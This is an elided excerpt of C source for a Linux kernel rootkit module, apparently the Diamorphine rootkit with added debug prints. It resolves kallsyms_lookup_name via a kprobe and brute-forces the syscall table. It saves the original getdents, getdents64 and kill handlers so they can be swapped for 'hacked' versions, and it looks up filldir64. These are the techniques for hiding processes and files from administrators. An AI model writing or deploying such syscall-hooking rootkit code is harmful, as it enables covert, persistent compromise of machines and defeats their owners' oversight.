...
void find_my_kallsyms_lookup_name(void){
    // find the kallsyms_lookup_name function
	struct kprobe kp;
	char* symbol_name = "kallsyms_lookup_name";
	kp.symbol_name = symbol_name;
    register_kprobe(&kp);
    my_kallsyms_lookup_name = (void* (*)(const char*)) kp.addr;
...
{
        printk(KERN_INFO "performing hacked kill\n");
...
diamorphine_init(void)
{
	...
	find_my_kallsyms_lookup_name();

        printk(KERN_INFO "begin initialization\n");
        __sys_call_table = get_syscall_table_bf();
        printk(KERN_INFO "got syscall table\n");

        if (!__sys_call_table)
                return -1;

        printk(KERN_INFO "syscall table is at 0x%lx\n", (long) __sys_call_table);
        ...
        printk(KERN_INFO "tidying...\n");
        tidy();

        printk(KERN_INFO "getting syscall function addresses...\n");

        orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
        orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
        orig_kill = (t_syscall)__sys_call_table[__NR_kill];

        printk(KERN_INFO "kill syscall function is at 0x%lx\n", (long) orig_kill);
        printk(KERN_INFO "hacked_kill function is at 0x%lx\n", (long) hacked_kill);

		/*
        for (int i = __NR_restart_syscall; i <= __NR_cachestat; i++) {
                printk(KERN_INFO "syscall nr %i is at address 0x%lx\n", i, __sys_call_table[i]);
        }
		*/
        ...
        printk(KERN_INFO "replacing syscall functions\n");
		...
		printk(KERN_INFO "syscall __NR_kill is at address 0x%lx\n", __sys_call_table[__NR_kill]);

		bool (*filldir64)(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);

		filldir64 = (bool (*)(struct dir_context*, const char*, int, loff_t, u64, unsigned int)) my_kallsyms_lookup_name("filldir64");

		printk(KERN_INFO "filldir64 is at address 0x%lx\n", (void*) filldir64);
